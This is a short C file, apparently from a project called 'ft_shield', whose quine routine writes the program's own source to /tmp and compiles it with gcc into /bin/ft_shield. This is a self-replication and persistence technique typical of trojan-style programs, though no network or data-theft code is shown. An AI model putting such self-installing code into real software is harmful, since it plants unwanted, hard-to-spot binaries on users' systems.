#include "ft_shield.h"

extern char *source_code;

void print_code(const char *str, int fd)
{
	dprintf(fd, "\"");
	for (int i = 0; str[i]; i++)
	{
		if (str[i] == '"')
			dprintf(fd, "\\\"");
		else if (str[i] == '\n')
			dprintf(fd, "\\n");
		else if (str[i] == '\\')
			dprintf(fd, "\\\\");
		else if (str[i] == '\t')
			dprintf(fd, "\\t");
		else
			dprintf(fd, "%c", str[i]);
	}
	dprintf(fd, "\";\n");
}

#define TEMP_SHIELD "/tmp/ft_shield.c"
#define DEST_PATH "/bin/ft_shield"

void	quine(void)
{
	int fd_dst = open(TEMP_SHIELD, O_WRONLY | O_CREAT | O_TRUNC, 0755);
	if (fd_dst == -1) {
		ft_perror(TEMP_SHIELD);
		close(fd_dst);
		return ;
	}
	dprintf(fd_dst, "%s", source_code);
	print_code(source_code, fd_dst);
	close(fd_dst);
	system("gcc -s "TEMP_SHIELD" -o "DEST_PATH);
}

// char *source_code = "here introduce source code";
